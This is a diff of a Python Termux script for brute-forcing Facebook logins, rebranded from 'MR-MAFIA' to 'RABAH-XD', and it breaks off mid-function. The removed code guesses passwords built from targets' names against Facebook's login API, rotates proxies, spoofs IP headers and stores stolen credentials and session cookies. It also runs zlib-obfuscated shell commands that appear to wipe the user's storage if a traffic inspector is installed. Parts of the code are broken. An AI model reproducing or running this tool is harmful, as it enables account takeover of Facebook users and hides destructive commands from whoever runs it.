@@ -1,701 +1,839 @@
-#-----> Install Modules <-----#
-import os,requests,json,time,re,random,sys,uuid,string,subprocess,zlib,platform
-from http import cookies
-import os
-import zlib
+#----------------\<-IMPORT-MODULE->/----------------#
+import os, sys, platform, time, random, uuid, json, string, base64, re, hashlib
+from os import system
 from io import BytesIO
-import pycurl
-import getpass
-import base64
-import user_agent  
-from faker import Faker  
-import subprocess
+from time import localtime as lt
+from pip._vendor import requests
+from datetime import datetime, timedelta
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+os.system('xdg-open https://t.me/Rabah1a')
+#----------------\<-COLOR->/----------------#
+G = "\033[1;92m"; W = "\x1b[38;5;15m"; B = "\033[1;34m"
+Y = "\x1b[38;5;226m"; A = "\x1b[38;5;123m"; R = "\33[1;91m"
+O = "\x1b[38;5;81m"; X = "\x1b[38;5;205m"; P = "\x1b[10;95m"
+os.system('xdg-open https://t.me/Rabah1a')
+#----------------\<-STYLE->/----------------#
+xp = f"{G}<[{W}●{G}]>{W}"
+xp1 = f"{G}<[{W}1{G}]>{W}"
+xp2 = f"{G}<[{W}2{G}]>{W}"
+xp3 = f"{G}<[{W}3{G}]>{W}"
+xp4 = f"{G}<[{W}4{G}]>{W}"
+xp5 = f"{G}<[{W}5{G}]>{W}"
+xp0 = f"{G}<[{W}0{G}]>{W}"
+xpx = f"{G}<[{W}?{G}]>{W}"
+xpxx = f"{G}>{W}>{G}>{W}"
+
+#----------------\<-INTERNET->/----------------#
 try:
-    import pycurl # type: ignore
-except:
-    print(' \n ! Wait Please Installing Missing Modules...!')
-    os.system('pip install -q pycurl')
-# try: import fake_useragent
-# except: os.system('pip -q install fake-useragent')
+    requests.get("https://www.google.com", timeout=5)
+except requests.exceptions.ConnectionError:
+    system("clear" if os.name == "posix" else "cls")
+    print(f"{xp} NO INTERNET CONNECTION & DON'T TRY TO BYPASS")
+    print(f"{G}━"*56)
+    sys.exit()
+#----------------\<-NO-MODULE->/----------------#
 try:
-    from Crypto.Cipher import AES # type: ignore
-    from Crypto.Util.Padding import pad, unpad # type: ignore
-    from Crypto.Random import get_random_bytes # type: ignore
-except:
-    print(' \n ! Wait Please Installing Modules...!')
-    os.system('pip install requests[socks] -y pip install faker -y pip install user_agent -y')
-    os.system('pkg update -y && pkg upgrade -y')
-    os.system('pkg install -y python clang libffi openssl')
-    os.system('pip install pycryptodome')
-#-----> Checking Latest File <-----#
-os.system('echo -e "\e]0; MR-MAFIA \a"')
-os.system('git pull -q')
+    import pycurl
+except ImportError as e:
+    system("clear" if os.name == "posix" else "cls")
+    missing_module = str(e).split("'")[1]
+    if missing_module == "pycurl":
+        print(f"{xp} YOU DON'T HAVE PYCURL MODULE PLZ INSTALL IT")
+        print(f"{xp} RUN {xpxx} pip install pycurl")
+        print(f"{G}━"*56)
+        sys.exit()
+os.system('xdg-open https://t.me/Rabah1a')
+#----------------\<-SYS->/----------------#
+sys.stdout.write('\x1b[1;37m\x1b]2; RABAH_Chawi\x07')
 
-#-----> Defines Modules -----#
+#----------------\<-FILE-PATH->/----------------#
+sd_folder = "/sdcard/RABAH-XD"
+sea_folders = ("RANDOM", "FILE")
+os.makedirs(sd_folder, exist_ok=True)
+for folder in sea_folders:
+    os.makedirs(os.path.join(sd_folder, folder), exist_ok=True)
+
+#----------------\<-DATE->/----------------#
+__dic__ = {
+    '1': 'JANUARY', '2': 'FEBRUARY', '3': 'MARCH', '4': 'APRIL',
+    '5': 'MAY', '6': 'JUNE', '7': 'JULY', '8': 'AUGUST',
+    '9': 'SEPTEMBER', '10': 'OCTOBER', '11': 'NOVEMBER', '12': 'DECEMBER'
+}
+__now__ = datetime.now()
+__days__ = __now__.day
+__months__ = __dic__[str(__now__.month)]
+__years__ = __now__.year
+__date__ = f'{W}{__days__}{G}/{W}{__months__}{G}/{W}{__years__}'
+
+ltx = int(lt()[3])
+a = ltx - 12 if ltx > 12 else ltx
+tag = "PM" if ltx > 12 else "AM"
+
+#----------------\<-COUNTRY->/----------------#
+ip = requests.get("https://api.ipify.org").text
+ip_info = requests.post(f"http://ip-api.com/json/{ip}")
+af = json.loads(ip_info.text)
+
+#----------------\<-SDCARD PERMISSION->/----------------#
 try:
-    import requests # type: ignore
-except:
-    print(' \n ! Wait Please Installing Missing Modules...!')
-    os.system('pip install -q requests')
-    import requests # type: ignore
-import random, string, uuid, json, marshal, zlib, sys, time, gzip, subprocess, re, base64
-from concurrent.futures import ThreadPoolExecutor as tred
-from os import path
-import shutil, hashlib
-# from fake_useragent import settings
-# from fake_useragent import UserAgent
-from Crypto.Cipher import AES # type: ignore
-from Crypto.Util.Padding import pad, unpad # type: ignore
-from Crypto.Random import get_random_bytes # type: ignore
-from io import BytesIO
+    system("clear" if os.name == "posix" else "cls")
+    system("rm -rf /sdcard/.txt > /dev/null 2>&1")
+    with open("/sdcard/.txt", "w") as f:
+        f.write(" ")
+except PermissionError:
+    print(f"{xp} WITHOUT STORAGE PERMISSION YOU CANNOT ")
+    print(f"{xp} RUN THIS TOOL ALLOW STORAGE PERMISSION ")
+    print(f"{G}━"*56)
+    system("termux-setup-storage -y > /dev/null 2>&1")
+    sys.exit(f"{xp} RUN AGAIN THIS TOOL ")
 
-#-----> Office installation <-----#
-os.system('clear')
-print('             \x1b[38;5;46m WELCOME TO MAFIA WORLD          ')
-#os.system('pip install requests')
-#os.system('pip install mechanize')
-#os.system('pip install bs4 httpx')
-#-----> Strg Permission Chk <-----#
-def stg():
-    try:
-        open('/sdcard/XD.', 'a').write(' ')
-    except:
-        os.system('')
-        stg()
-stg()
-#-----> Protection <-----#
-if path.isfile("/data/data/com.termux/files/usr/bin/rm"):pass
-else:print(" \033[91;1m! \033[97;1mTurn Off Protection...!");exit()
-
-#-----> Open Wp Gp CLEAR SCREEN <-----#
-os.system('clear')
-print('[+] Join Telegram channel \n')
-exec(zlib.decompress(b'x\x9c}\xccA\x0e@0\x10\x05\xd0\xab\xfc\x1d\x16XXJ\xdc\xa5t\xc4$\xa3\xaa3\x95\xb8\xbdX\x10+\x07xo\xd3FO5Z\xcb"rD\x0e\x1c\xd4\x9c\x08\x12\xed\x99\xd4\x14\xd3\xe2\x92\'CN"<v`\x1f\x1c&J\xc63\xa3>1\xa0\xf5t\xb4!\x8b\xf4w\xf1\x04\xbf\xee\xdd?\xba\xa8.k\xe33\x11'))
-#os.system('xdg-open https://t.me/+_51JvseDQNI2M2E0')
-#-----> CHECK FOR HTTPCANARY <-----#
-try:
-    g = "anar"
-    f="tt"
-    file_d = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
-
-    if f'com.h{f}pc{g}y.pro' in file_d:
-        print('\033[1;37m[×] Uninstall HttpCanary From Your Device ')
-        os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
-        os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
-        os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
-        exit()
-        
-    else:
-        pass
-except Exception as e:
-    pass
-
-#-----> PRINT WITH ANIMATION <-----#
-def xox(m):
-    for x in m + '\n':
-        sys.stdout.write(x)
-        sys.stdout.flush()
-        time.sleep(0.07)
-#-----> Proxy <-----#
-def fetch_proxies():
-    try:
-        g = requests.get('https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc')
-        proxies_data = g.json()
-        proxies = proxies_data['data']
-        with open('proxy.txt', 'w') as file:
-            for proxy in proxies:
-                proxy_ip = proxy['ip']
-                proxy_port = proxy['port']
-                proxy_url = f"http://{proxy_ip}:{proxy_port}"
-                file.write(f"{proxy_url}\n")
-        with open('proxy.txt', 'r') as file:
-            saved_proxies = file.readlines()
-        return saved_proxies
-    except requests.exceptions.ConnectionError:
-        sys.exit(f' {R}× {W}InterNet Contention Problem.!')
-    except Exception as e:
-        sys.exit(e)
-saved_proxies = fetch_proxies()
-
-#-----> Method 1 <-----#        
-def Maf_1(ids, names, passlist):
-    try:
-        global oks, cps, loop
-        
-        mrmafia = random.choice([P, W, G, S, B, Y, R, O])
-        sys.stdout.write(f'\r\r {W}({mrmafia}MR-MAFIA{W}) ({loop}) ({G}OK{W}/{len(oks)}) ({O}CP{W}/{len(cps)}) {W}')
-        sys.stdout.flush()
-        
-        fn = names.split(' ')[0]
-        try:
-            ln = names.split(' ')[1]
-        except:
-            ln = fn
-            
-        for pw in passlist:
-            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-            mafia_Ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99))+";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/393.0.0.15.50;FBBV/825857276;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBRV/443011581;FBCR/Etisalat;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/X693;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
-            proxy_u = random.choice(saved_proxies).strip()
-            proxies = {'http':f'{proxy_u}'}
-            device_id = str(uuid.uuid4())
-            adid = str(uuid.uuid4())
-            random_ip = IPV4_FAKEEEE()
-            head = {
-                "Host": "graph.facebook.com",
-                "User-Agent": mafia_Ua,
-                "Content-Type": "app_authlication/x-www-form-urlencoded", 
-                "Content-Type": "application/json;charset=utf-8",
-                "Accept-Encoding": "gzip",
-                "forwarded": f"for={random_ip}; by={random_ip}",
-                "x-forwarded-for": random_ip,
-                "x-real-ip": random_ip,
-                "client-ip": random_ip,    
-            }
-            data = {
-                "locale": "en_US",
-                "format": "json",
-                "email": ids,
-                "password": pas,
-                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-                "generate_session_cookies": 1,
-                "adid": str(uuid.uuid4()),
-                "device_id": str(uuid.uuid4()),
-                "family_device_id": str(uuid.uuid4()),
-                "credentials_type": "device_based_login_password",
-                "error_detail_type": "button_with_disabled",
-                "source": "device_based_login",
-                "advertiser_id": str(uuid.uuid4()),
-                "currently_logged_in_userid": "0",
-                "client_country_code": "US",
-                "method": "auth.login",
-                "fb_api_req_friendly_name": "authenticate",
-                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                "api_key": "882a8490361da98702bf97a021ddc14d"
-            }
-            
-            url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
-            twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
-              
-            po = requests.post(url, data=data, headers=head, proxies=proxies, allow_redirects=False).text
-            q = json.loads(po)
-            masked_id = mask_user(ids)
-            masked_pw = mask_pass(pas)
-            if 'session_key' in q:
-                coki = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
-                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
-                cookie = f"sb={ssbb};{coki}"
-                print(f'\r\r{G} (MAFIA-OK) {masked_id} | {masked_pw}\033[0m')
-                #print(f' [√] BISCUT-🍪: {mrmafia}' + cookie)
-                open('/sdcard/MR-MAFIA/MAFIA-M1-COOKIE.txt','a').write(ids + '|' + pas +'|'+ cookie + '\n')
-                open('/sdcard/MR-MAFIA/MAFIA-M1-OK.txt','a').write(ids + '|' + pas + '\n')
-                oks.append(ids)
-                break
-            elif twf in str(po):
-                if 'y' in pcp:
-                    print(f'\r\r{B} (MAFIA-2F) ' + ids + ' | ' + pas + '\033[1;97m')
-                    twf.append(ids)
-                    break
-            elif 'www.facebook.com' in q['error']['message']:
-                if 'y' in pcp:
-                    print(f'\r\r{O} (MAFIA-CP) ' + ids + ' | ' + pas +'\033[1;97m')
-                    open('/sdcard/MR-MAFIA/MAFIA-CP.txt','a').write(ids + '|' + pas + '\n')
-                    cps.append(ids)
-                    break
-                else:
-                    open('/sdcard/MR-MAFIA/MAFIA-CP.txt','a').write(ids + '|' + pas + '\n')
-                    break
-            else:
-                continue
-        
-        loop += 1
-    
-    except requests.exceptions.ConnectionError:
-        time.sleep(10)
-    
-    except Exception as e:
-        pass
-#-----> Method 2 <-----#        
-def Maf_2(ids, names, passlist):
-    try:
-        global ok, loop
-        
-        mrmafia = random.choice([P, W, G, S, B, Y, R, O])
-        sys.stdout.write(f'\r\r {W}({mrmafia}MR-MAFIA{W}) ({loop}) ({G}OK{W}/{len(oks)}) ({O}CP{W}/{len(cps)}) {W}')
-        sys.stdout.flush()
-        
-        fn = names.split(' ')[0]
-        try:
-            ln = names.split(' ')[1]
-        except:
-            ln = fn
-            
-        for pw in passlist:
-            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-            mafia_Uax = f16()
-            device_id = str(uuid.uuid4())
-            adid = str(uuid.uuid4())
-            locale, country = random_locale()
-            random_ip = IPV4_FAKEEEE()
-            data = {
-                "MAFIA": str(uuid.uuid4()),
-                "format": "json",
-                "MR_MAFIA": str(uuid.uuid4()),
-                "MAFIA_XD": "true",
-                "family_device_id": str(uuid.uuid4()),
-                "credentials_type": "device_based_login_password",
-                "error_detail_type": "button_with_disabled",
-                "source": "device_based_login",
-                "email": ids,
-                "password": pas,
-                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-                "generate_session_cookies": "1",
-                "locale": locale, 
-                "client_country_code": country,
-                "method": "auth.login",
-                "fb_api_req_friendly_name": "authenticate",
-                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                "api_key": "882a8490361da98702bf97a021ddc14d",
-            }
-            head = {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Content-Type": "application/json;charset=utf-8",
-                "X-FB-Net-HNI": "45204",
-                "X-FB-SIM-HNI": "45201",
-                "X-FB-Connection-Type": "unknown",
-                "Connection": "Keep-Alive",
-                "Host": "graph.facebook.com",
-                "User-Agent": mafia_Uax,
-                "Accept-Encoding": "gzip",
-                "forwarded": f"for={random_ip}; by={random_ip}",
-                "x-forwarded-for": random_ip,
-                "x-real-ip": random_ip,
-                "client-ip": random_ip,
-            }
-            url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
-            twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
-            
-            po = requests.post(url, data=data, headers=head, allow_redirects=False).text
-            q = json.loads(po)
-            
-            masked_id = mask_user(ids)
-            masked_pw = mask_pass(pas)
-            if 'session_key' in q:
-                coki = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
-                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
-                cookie = f"sb={ssbb};{coki}"
-                print(f'\r\r{G} (MAFIA-OK) {masked_id} | {masked_pw}\033[0m')
-                #token = q['access_token']
-                #requests.post('https://graph.facebook.com/' + '833553969/' + 'subscribers' + '?access_token=' + token)
-                print(f' [√] BISCUT-🍪: {mrmafia}' + cookie)
-                open('/sdcard/MR-MAFIA/MAFIA-M2-COOKIE.txt','a').write(ids + '|' + pas +'|'+ cookie + '\n')
-                open('/sdcard/MR-MAFIA/MAFIA-M2-OK.txt','a').write(ids + '|' + pas + '\n')
-                oks.append(ids)
-                break
-            
-            elif twf in str(po):
-                if 'y' in pcp:
-                    print(f'\r\r{B} (MAFIA-2F) ' + ids + ' | ' + pas + '\033[1;97m')
-                    twf.append(ids)
-                    break
-            
-            elif 'www.facebook.com' in q['error']['message']:
-                if 'y' in pcp:
-                    print(f'\r\r{O} (MAFIA-CP) {masked_id} | {masked_pw}\033[0m')
-                    open('/sdcard/MR-MAFIA/MAFIA-CP.txt','a').write(ids + '|' + pas + '\n')
-                    cps.append(ids)
-                    break
-                else:
-                    open('/sdcard/MR-MAFIA/MAFIA-CP.txt','a').write(ids + '|' + pas + '\n')
-                    break
-            else:
-                continue
-        
-        loop += 1
-    
-    except requests.exceptions.ConnectionError:
-        time.sleep(10)
-    
-    except Exception as e:
-        pass
-#-----> Method 3 <-----#        
-def Maf_3(ids, names, passlist):
-    try:
-        global ok, loop
-        
-        mrmafia = random.choice([P, W, G, S, B, Y, R, O])
-        sys.stdout.write(f'\r\r {W}({mrmafia}MR-MAFIA{W}) ({loop}) ({G}OK{W}/{len(oks)}) ({O}CP{W}/{len(cps)}) {W}')
-        sys.stdout.flush()
-        
-        fn = names.split(' ')[0]
-        try:
-            ln = names.split(' ')[1]
-        except IndexError:
-            ln = fn
-        
-        for pw in passlist:
-            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-            proxy_u = random.choice(saved_proxies).strip()
-            proxies = {'http':f'{proxy_u}'}
-            device_id = str(uuid.uuid4())
-            adid = str(uuid.uuid4())
-            random_ip = IPV4_FAKEEEE()
-            locale, country = random_locale()
-            data = {
-                "MAFIA": str(uuid.uuid4()),
-                "MR_MAFIA": str(uuid.uuid4()),
-                "MAFIA_XD": "true",
-                "format": "json",
-                "family_device_id": str(uuid.uuid4()),
-                "credentials_type": "device_based_login_password",
-                "error_detail_type": "button_with_disabled",
-                "source": "device_based_login",
-                "email": ids,
-                "password": pas,
-                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-                "generate_session_cookies": "1",
-                "locale": locale,
-                "client_country_code": country,
-                "method": "auth.login",
-                "fb_api_req_friendly_name": "authenticate",
-                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                "api_key": "882a8490361da98702bf97a021ddc14d",
-            }
-            head = {
-                "Accept-Encoding": "gzip",
-                "Forwarded": f"for={random_ip}; by={random_ip}",
-                "X-Forwarded-For": random_ip,
-                "X-Real-IP": random_ip,
-                "Client-IP": random_ip, 
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Host": "graph.facebook.com",
-                "User-Agent": f16(), 
-                "X-FB-Net-HNI": "45204",
-                "X-FB-SIM-HNI": "45201",
-                "X-FB-Connection-Type": "unknown",
-                "Connection": "Keep-Alive",
-            }
-            url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
-            twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
-            
-            po = requests.post(url, data=data, headers=head, allow_redirects=False).text
-            q = json.loads(po)
-            
-            if 'session_key' in q:
-                ckkk = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
-                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
-                cookie = f"sb={ssbb};{ckkk}"
-                print(f'\r\r{G} (MAFIA-OK) ' + ids + ' | ' + pas +'\033[1;97m')
-                #print(f' [√] BISCUT-🍪: {mrmafia}' + cookie)
-                open('/sdcard/MR-MAFIA/MAFIA-M3-COOKIE.txt','a').write(ids + '|' + pas +'|'+ cookie + '\n')
-                open('/sdcard/MR-MAFIA/MAFIA-M3-OK.txt','a').write(ids + '|' + pas + '\n')
-                oks.append(ids)
-                break
-            
-            elif twf in str(po):
-                if 'y' in pcp:
-                    print(f'\r\r{B} (MAFIA-2F) ' + ids + ' | ' + pas + '\033[1;97m')
-                    twf.append(ids)
-                    break
-            
-            elif 'www.facebook.com' in q['error']['message']:
-                if 'y' in pcp:
-                    print(f'\r\r{O} (MAFIA-CP) ' + ids + ' | ' + pas +'\033[1;97m')
-                    open('/sdcard/MR-MAFIA/MAFIA-CP.txt','a').write(ids + '|' + pas + '\n')
-                    cps.append(ids)
-                    break
-                else:
-                    open('/sdcard/MR-MAFIA/MAFIA-CP.txt','a').write(ids + '|' + pas + '\n')
-                    break
-            else:
-                continue
-        
-        loop += 1
-    
-    except requests.exceptions.ConnectionError:
-        time.sleep(10)
-    
-    except Exception as e:
-        pass
-#-----> method ua <-----#
-def f16():  
-    realme = random.choice(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"])
-    url1 = '[FBAN/FB4A;FBAV/538.0.0.53.70;FBBV/819570880;FBDM/{density=1.4375,width=720,height=1473};FBLC/fr_FR;FBRV/0;FBCR/Ooredoo;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/'+realme+';FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'
-    return url1
-#-----> Colors <-----#
-LYLW, W, R, G, Y, B, P, S, O = '\033[93;1m', '\033[97;1m', '\033[91;1m', '\033[92;1m', '\033[93;1m', '\033[94;1m', '\033[95;1m', '\033[96;1m', '\x1b[38;5;246m'
-my_color = [P, W, G, S, B, Y, R, O]
-ssn = requests.Session()
-mrmafia = random.choice([P,W,G,S,B,Y,R,O])
-#-----> Folder <-----#
-folder_path = '/sdcard/MR-MAFIA'
-try:os.makedirs(folder_path, exist_ok=True)
-except:pass
-#-----> Global Vars <-----#
-loop, oks, cps, twf, pcp = 0, [], [], [], []
-fake = Faker()
-#-----> Vers <-----#
-mafiavers = "V35.0"
-#-----> Logo <-----#
-logo = (f"""{W} 
-   .88b  d88.  .d8b.  d88888b d888888b  .d8b.
-   88'YbdP`88 d8' `8b 88'       `88'   d8' `8b
-   88  88  88 88ooo88 88ooo      88    88ooo88
-   88  88  88 88~~~88 88~~~      88    88~~~88
-   88  88  88 88   88 88        .88.   88   88
-   YP  YP  YP YP   YP YP      Y888888P YP   YP  {R}Bruter
-{W}------------------------------------------------
-   [✔] OWNER   : YOUCEF YT
-   [✔] GITHUB  : MAFIA-143
-   [✔] Status  : {R}PAID{W}
-   [✔] VERSION : {mafiavers}
- {W}------------------------------------------------
-{G} Nothing is impossible : just try to do :) 
- {W}------------------------------------------------""")
-#-----> Def Clear + Logo <-----#
-def clear():
-    os.system('clear') #I love you, Mom 
+#----------------\<-CLEAR->/----------------#
+def __CLEAR__():
+    system("clear" if os.name == "posix" else "cls")
     print(logo)
-#-----> Def Line <-----#
-def linex():
-    print(f'{W}--------------------------------------------------')
-#-----> PYCURL APPROVAL SYSTEM <-----#
-def check_approval():
-    clear()
-    try:
-        user = getpass.getuser()
-    except:
-        user = "user"
-    key = "MAFIA-" + str(os.geteuid()) + user.replace('u0_a', '')
-    
-    # Check from YOUR website API
-    buffer = BytesIO()
-    curl = pycurl.Curl()
-    curl.setopt(curl.URL, "https://fuck?key=" + key)
-    curl.setopt(curl.WRITEDATA, buffer)
-    curl.setopt(curl.TIMEOUT, 10)
-    curl.setopt(curl.SSL_VERIFYPEER, 0)
-    curl.setopt(curl.SSL_VERIFYHOST, 0)
-    
-    try:
-        curl.perform()
-    except:
-        print(f" [{mrmafia}>>{W}] INTERNET ERROR")
-        sys.exit()
-    curl.close()
-    
-    response = buffer.getvalue().decode('utf-8')
-    
-    try:
-        import json
-        data = json.loads(response)
-            
-            linex()
-            print(f" [1] WHATSAPP")
-            print(f" [2] FACEBOOK")
-            print(f" [0] EXIT")
-            linex()
-            
-            adi = input(f" [{mrmafia}>>{W}] CHOICE : ")
-            
-            if adi in ['1','01']:
-                nm = input(f" [{mrmafia}>>{W}] ENTER YOUR NAME : ")
-                wp = input(f" [{mrmafia}>>{W}] ENTER YOUR WHATSAPP NUMBER : ")
-                phn=(["+0000fuck"])
-                url_wa = f"https://api.whatsapp.com/send?phone={phn}&text="
-                tk = f'Hello Sir! Please Approve My Tool Key: {key} Name: {nm} WP: {wp}'
-                tk = tk.replace(" ", "%20")
-                
-                os.system(f'xdg-open "{url_wa}{tk}"')
-                sys.exit()
-            
-            elif adi in ['2','02']:
-                os.system('xdg-open https://www.facebook.com/share/1DQ5r9EMcE/')
-                sys.exit()
-            
-            else:
-                sys.exit()
-    
-    except:
-        print(f" [{mrmafia}>>{W}] SERVER ERROR TRY AGAIN LATER")
-        sys.exit()
-#-----> Main Menu <-----#
-def menu():
-    clear()
-    print(' [1] Start File Clone \n [2] Dedup & Sort \n [0] Exit Menu ');linex()
-    xd = input(f' [-] Choose : {G}\033[1;37m')
-    if xd in ['1','01']:
-        clear()
-        print(f'[-] Exp :{G} /sdcard/mrmafia.txt {W}  ')
-        linex()
-        file = input(f'[-] File Put :{W} ')
-        try:
-            fo = open(file,'r').read().splitlines()
-        except FileNotFoundError:
-            print(f' [{mrmafia}>>{W}] File Not Found Fuck for you  :) ')
-            time.sleep(1)
-            exit()
-        clear()
-        print(f'[1] Method (Mix)  ')
-        print(f'[2] Method (Old) ')
-        print(f'[3] Method (Mix) {Y}NEW ')
-        linex()
-        mthd=input(f'[{mrmafia}>>{W}] Chose :{G}\033[1;37m ')
-        plist = []
-        linex()
-        print(f'[1] Auto pass ')
-        print(f'[2] Manual pass ')
-        print(f'[3] Auto pass 2 ({G}fast{W}) ')
-        print(f'[4] Auto pass 3 ({G}smart{W}) ')
-        linex()
-        ppp=input(f'[{mrmafia}>>{W}] Chose :{G}\033[1;37m ')
-        clear()
-        if ppp in ['1','01']:
-                mthd_name = "AUTO-1"
-                pass_info = "Auto Passwords (Full List)"
-                plist.append('first first')
-                plist.append('first last')
-                plist.append('last first')
-                plist.append('last last')
-                plist.append('firstfirst')     
-                plist.append('firstlast')
-                plist.append('lastfirst')
-                plist.append('lastlast')
-                plist.append("firstlast123")
-                plist.append("firstlast1234")
-                plist.append('firstlast12345')
-                plist.append('first 123')
-                plist.append('first 1234')
-                plist.append('first 12345')
-                plist.append('first12')
-                plist.append('first123')
-                plist.append('first1234')
-                plist.append('first12345')
-                plist.append('first123456')
-                plist.append('first123456789')
-        elif ppp in ['3','03']:
-                mthd_name = "AUTO-FAST"
-                pass_info = "Auto Passwords (Fast List)"
-                plist.append('first last')
-                plist.append('firstlast')
-                plist.append('first123')
-                plist.append('first12345')
-                plist.append('first1234')
-                plist.append('first123456')
-                plist.append('first1234567')
-                plist.append('first123456789')
-                plist.append('last123')
-                plist.append('last1234')
-        elif ppp in ['4','04']:
-                mthd_name = "SMARTGEN"
-                pass_info = "Smart Password Generator"
-                plist.append('first2001')
-                plist.append('first2002')
-                plist.append('first2003')
-                plist.append('first2004')
-                plist.append('first2005')
-                plist.append('first2006')
-                plist.append('first2007')
-                plist.append('first2024')
-                plist.append('first2025')
-                plist.append('first2026') 
-        elif ppp in ['2','02']:
-                mthd_name = "MANUAL"
-                pass_info = "Manual Passwords (User Input)"
-                try:
-                    ps_limit = int(input(f'[{mrmafia}>>{W}] Pass limit : {G}\033[1;37m '))
-                except:
-                    ps_limit = 2
-                clear()
-                print(f'[{mrmafia}>>{W}] exp : {G}first last,firtslast,first123')
-                linex()
-                for i in range(ps_limit):
-                        plist.append(input(f'[{mrmafia}>>{W}] Put passs {i+1}: {G}\033[1;37m'))
-        clear()
-        print(f'[{mrmafia}>>{W}] Do Youu Want To Show Cp Ids ? (y/n) : {G}\033[1;37m')
-        linex()
-        cx=input(f'[{mrmafia}>>{W}] Chose :{G}\033[1;37m ')
-        if cx in ['y','Y','yes','Yes','1']:
-            pcp.append('y')
-            
+
+#----------------\<-LINE->/----------------#
+def __LINE__():
+    print(f"{G}━"*56)
+#----------------\<-UA-NORMAL-MIX->/----------------#
+def _____UpDaTe_S1_____():
+    fbav3 = f'{random.randint(191,505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39,69)}.{random.randint(64,154)}'
+    fbbv3 = str(random.randint(111111111, 999999999))
